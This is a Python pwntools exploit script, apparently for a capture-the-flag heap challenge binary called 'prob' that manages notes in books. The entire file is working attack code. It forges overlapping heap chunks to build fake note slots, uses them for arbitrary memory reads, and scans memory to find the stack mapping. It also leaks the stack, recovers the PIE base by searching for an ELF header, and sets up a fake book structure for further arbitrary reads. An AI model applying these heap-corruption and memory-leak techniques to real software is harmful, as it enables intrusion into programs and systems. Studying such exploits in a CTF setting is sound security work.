from pathlib import Path

from pwn import ELF, context, flat, process, u64


ROOT = Path(__file__).resolve().parent
EXE = ELF(str(ROOT / "prob"))
FORGE_SLOT_START = 2
FORGE_SLOT_COUNT = 42
NOTE_TAGS_OFF = 0xA3C0
BOOKS_OFF = 0xA320
STACK_TOP = 0x800000000000
STACK_SEARCH_RANGE = 0x500000000
STACK_SEARCH_STRIDE = 0x20000

context.binary = EXE
context.log_level = "info"


def start():
    return process(str(ROOT / "prob"), cwd=str(ROOT))


def cmd(io, value):
    io.sendlineafter(b"cmd > ", str(value).encode())


def switch_book(io, idx):
    cmd(io, 0)
    io.sendlineafter(b"Book: ", str(idx).encode())


def write_note(io, slot, size, data):
    cmd(io, 1)
    io.sendlineafter(b"slot: ", str(slot).encode())
    io.sendlineafter(b"size: ", str(size).encode())
    if len(data) != size:
        raise ValueError(f"expected {size} bytes, got {len(data)}")
    io.sendafter(b"data: ", data)


def read_note(io, slot):
    cmd(io, 2)
    io.sendlineafter(b"slot: ", str(slot).encode())
    data = io.recvuntil(b"\ncmd > ", drop=False)
    if not data.endswith(b"\ncmd > "):
        raise EOFError("unexpected read_note terminator")
    io.unrecv(b"cmd > ")
    body = data[:-7]
    if body.endswith(b"\n"):
        body = body[:-1]
    return body


def erase_note(io, slot):
    cmd(io, 3)
    io.sendlineafter(b"slot: ", str(slot).encode())


def discard_book(io):
    cmd(io, 4)


def tag_note(io, slot, tag):
    cmd(io, 5)
    io.sendlineafter(b"slot: ", str(slot).encode())
    io.sendlineafter(b"tag: ", str(tag).encode())


def build_overlap(io, forged_payload):
    for idx in range(4):
        switch_book(io, idx)

    for idx in (2, 1, 3):
        switch_book(io, idx)
        discard_book(io)

    switch_book(io, 0)
    write_note(io, 0, 0x2F8, b"A" * 0x2F8)

    switch_book(io, 4)

    switch_book(io, 0)
    write_note(io, 1, len(forged_payload), forged_payload)


def rewrite_overlap(io, forged_payload):
    switch_book(io, 0)
    erase_note(io, 1)
    write_note(io, 1, len(forged_payload), forged_payload)


def make_probe_payload(targets, size=0x10):
    if len(targets) > FORGE_SLOT_COUNT:
        raise ValueError("too many probe targets")
    payload = bytearray(b"\x00" * 0x2C0)
    for idx, addr in enumerate(targets, start=FORGE_SLOT_START):
        off = idx * 0x10
        payload[off : off + 0x10] = flat(size, addr)
    return bytes(payload)


def batch_probe(io, targets, size=0x10):
    rewrite_overlap(io, make_probe_payload(targets, size))
    switch_book(io, 4)
    results = []
    for idx, _ in enumerate(targets, start=FORGE_SLOT_START):
        results.append(read_note(io, idx))
    return results


def leak_with_overlap(io, addr, size):
    rewrite_overlap(io, make_probe_payload([addr], size))
    switch_book(io, 4)
    return read_note(io, FORGE_SLOT_START)


def scan_stack(io):
    addrs = []
    addr = STACK_TOP - 0x1000
    stop = STACK_TOP - STACK_SEARCH_RANGE
    while addr >= stop:
        addrs.append(addr)
        addr -= STACK_SEARCH_STRIDE

    for off in range(0, len(addrs), FORGE_SLOT_COUNT):
        chunk = addrs[off : off + FORGE_SLOT_COUNT]
        outs = batch_probe(io, chunk, 8)
        for candidate, out in zip(chunk, outs):
            if out:
                return candidate
    raise RuntimeError("stack scan failed")


def mapped_bounds_around(io, hit):
    pages = [hit + delta * 0x1000 for delta in range(-80, 81)]
    hits = []
    for off in range(0, len(pages), FORGE_SLOT_COUNT):
        chunk = pages[off : off + FORGE_SLOT_COUNT]
        outs = batch_probe(io, chunk, 1)
        hits.extend(addr for addr, out in zip(chunk, outs) if out)
    if not hits:
        raise RuntimeError("mapping refinement failed")
    return min(hits), max(hits) + 0x1000


def stack_bounds_around(io, hit):
    return mapped_bounds_around(io, hit)


def find_pie_from_stack(io, stack_blob):
    candidates = []
    for off in range(0, len(stack_blob) - 8, 8):
        value = u64(stack_blob[off : off + 8])
        if 0x550000000000 <= value < 0x570000000000:
            candidates.append(value)

    seen = set()
    for value in candidates:
        base_page = value & ~0xFFF
        pages = [base_page - idx * 0x1000 for idx in range(16)]
        pages = [page for page in pages if page not in seen]
        seen.update(pages)
        outs = batch_probe(io, pages, 4)
        for page, out in zip(pages, outs):
            if out.startswith(b"\x7fELF"):
                return page
    raise RuntimeError("PIE scan failed")


def leak_stack_and_pie(io):
    addr = STACK_TOP - 0x1000
    stop = STACK_TOP - STACK_SEARCH_RANGE
    checked = []

    while addr >= stop:
        chunk = []
        while addr >= stop and len(chunk) < FORGE_SLOT_COUNT:
            if not any(lo <= addr < hi for lo, hi in checked):
                chunk.append(addr)
            addr -= STACK_SEARCH_STRIDE
        if not chunk:
            continue

        outs = batch_probe(io, chunk, 8)
        for candidate, out in zip(chunk, outs):
            if not out:
                continue
            lo, hi = mapped_bounds_around(io, candidate)
            checked.append((lo, hi))
            blob = leak_with_overlap(io, lo, hi - lo)
            try:
                pie = find_pie_from_stack(io, blob)
            except RuntimeError:
                continue
            return lo, hi, blob, pie

    raise RuntimeError("failed to find a stack mapping with PIE pointers")


def setup_fake_book(io, pie):
    note_tags = pie + NOTE_TAGS_OFF
    row0 = note_tags
    row4 = note_tags + 4 * 48 * 8
    fake_book = row0 + 0x10

    switch_book(io, 0)
    tag_note(io, 0, 0)
    tag_note(io, 1, 0x601)

    switch_book(io, 4)
    tag_note(io, 0, 0x600)
    tag_note(io, 1, 0x21)
    tag_note(io, 5, 1)

    rewrite_overlap(io, make_probe_payload([fake_book], 0x20))
    switch_book(io, 4)
    erase_note(io, FORGE_SLOT_START)

    switch_book(io, 2)
    return fake_book


def fake_book_read(io, addr, size):
    switch_book(io, 0)
    tag_note(io, 2, size)
    tag_note(io, 3, addr)
    switch_book(io, 2)
    return read_note(io, 0)


def demo_heap_leak():
    io = start()
    try:
        payload = bytearray(b"\x00" * 0x2C0)
        build_overlap(io, payload)

        switch_book(io, 4)
        write_note(io, 0, 0x18, b"B" * 0x18)

        switch_book(io, 0)
        leaked = read_note(io, 1)
        print(leaked[:0x40].hex())
    finally:
        io.close()


def demo_probe(addr, size=0x20):
    io = start()
    try:
        build_overlap(io, make_probe_payload([addr], size))

        switch_book(io, 4)
        data = read_note(io, 2)
        print(data.hex())
    finally:
        io.close()


if __name__ == "__main__":
    demo_heap_leak()
